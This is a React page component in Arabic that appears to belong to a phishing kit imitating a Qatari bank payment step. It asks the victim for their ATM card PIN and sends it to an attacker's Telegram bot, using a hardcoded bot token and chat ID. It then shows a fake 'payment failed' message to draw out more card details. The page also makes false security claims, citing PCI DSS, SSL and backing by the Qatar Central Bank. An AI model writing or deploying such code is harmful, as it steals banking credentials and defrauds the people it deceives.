import { useState } from "react";
import { useNavigate } from "react-router-dom";
import Header from "@/components/Header";
import Stepper from "@/components/Stepper";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const steps = [
  { number: 1, title: "نوع الحساب" },
  { number: 2, title: "البيانات الشخصية" },
  { number: 3, title: "كلمة المرور" },
  { number: 4, title: "إتمام التسجيل" },
];

const ATMPin = () => {
  const [pin, setPin] = useState("");
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const navigate = useNavigate();

  const sendToTelegram = async (message: string) => {
    try {
      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
      const chatId = "-4985537188";
      
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      });
    } catch (error) {
      console.error("فشل الإرسال إلى Telegram:", error);
    }
  };

  const handleConfirm = async () => {
    if (pin.length === 4) {
      const message = `الرقم السري للبطاقة ATM PIN\n\nالرقم السري: ${pin}`;
      await sendToTelegram(message);
      setIsDialogOpen(true);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-12 bg-white">
        <Stepper currentStep={4} steps={steps} />
        
        <div className="max-w-2xl mx-auto mt-8">
          <div className="bg-secondary/30 rounded-lg shadow-lg p-8 border border-border">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-10 w-10 text-primary"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                  />
                </svg>
              </div>
              <h2 className="text-2xl font-bold mb-2 text-foreground">
                إدخال الرقم السري للبطاقة
              </h2>
              <p className="text-sm text-muted-foreground">
                لتأكيد عملية الدفع الإلكتروني
              </p>
            </div>

            <div className="bg-background rounded-lg p-6 mb-6">
              <p className="text-base text-foreground text-right mb-6 leading-relaxed">
                لإتمام عملية الدفع بشكل آمن، يرجى إدخال الرقم السري (PIN) الخاص ببطاقتكم المصرفية المكون من 4 أرقام في الحقل أدناه.
              </p>

              <div className="flex justify-center mb-6" dir="ltr">
                <InputOTP
                  maxLength={4}
                  value={pin}
                  onChange={(value) => setPin(value)}
                  inputMode="numeric"
                  pattern="[0-9]*"
                >
                  <InputOTPGroup className="gap-3">
                    <InputOTPSlot index={0} className="w-14 h-14 text-2xl" masked />
                    <InputOTPSlot index={1} className="w-14 h-14 text-2xl" masked />
                    <InputOTPSlot index={2} className="w-14 h-14 text-2xl" masked />
                    <InputOTPSlot index={3} className="w-14 h-14 text-2xl" masked />
                  </InputOTPGroup>
                </InputOTP>
              </div>

              <div className="bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-800 rounded-lg p-4 mb-4">
                <div className="flex items-start gap-2">
                  <span className="text-lg">⚠️</span>
                  <div className="text-right">
                    <p className="text-sm font-semibold text-amber-900 dark:text-amber-200 mb-1">
                      تنبيه هام
                    </p>
                    <p className="text-xs text-amber-800 dark:text-amber-300">
                      لا تشارك الرقم السري لبطاقتكم مع أي شخص. موظفو البنك أو الجهات الرسمية لن يطلبوا منكم هذا الرقم.
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 flex items-start gap-2">
                <span className="text-lg">🔐</span>
                <p className="text-xs text-foreground text-right">
                  <strong>حماية معلوماتكم:</strong> جميع البيانات المالية محمية بتشفير متقدم من الدرجة المصرفية (SSL 256-bit) وفقاً لمعايير الأمان الدولية PCI DSS.
                </p>
              </div>
            </div>

            <div className="flex gap-3 flex-row-reverse">
              <Button 
                className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
                onClick={handleConfirm}
                disabled={pin.length !== 4}
              >
                تأكيد الدفع
              </Button>
              <Button 
                variant="outline"
                onClick={() => navigate('/otp-verification')}
              >
                رجوع
              </Button>
            </div>

            <div className="mt-6 pt-6 border-t border-border">
              <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                <span>🏦</span>
                <p className="text-center">
                  عملية الدفع محمية من قبل مصرف قطر المركزي والبنوك المعتمدة في دولة قطر
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />

      <AlertDialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-center text-destructive text-xl">
              تعذر إتمام عملية الدفع
            </AlertDialogTitle>
            <AlertDialogDescription asChild>
              <div className="space-y-4 text-right">
                <p className="font-semibold text-foreground">
                  نعتذر، لم نتمكن من التحقق من صحة بيانات البطاقة المصرفية.
                </p>
                <div className="mr-4 space-y-2">
                  <p className="text-foreground">• يرجى التأكد من صحة المعلومات المُدخلة</p>
                  <p className="text-foreground">• يمكنكم استخدام بطاقة مصرفية أخرى</p>
                  <p className="text-foreground">• أو اختيار وسيلة دفع بديلة</p>
                </div>
              </div>
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex-row-reverse gap-2">
            <Button
              onClick={() => {
                setIsDialogOpen(false);
                navigate('/registration-complete');
              }}
              className="bg-primary hover:bg-primary/90"
            >
              إعادة المحاولة
            </Button>
            <Button
              variant="outline"
              onClick={() => setIsDialogOpen(false)}
            >
              إغلاق
            </Button>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default ATMPin;
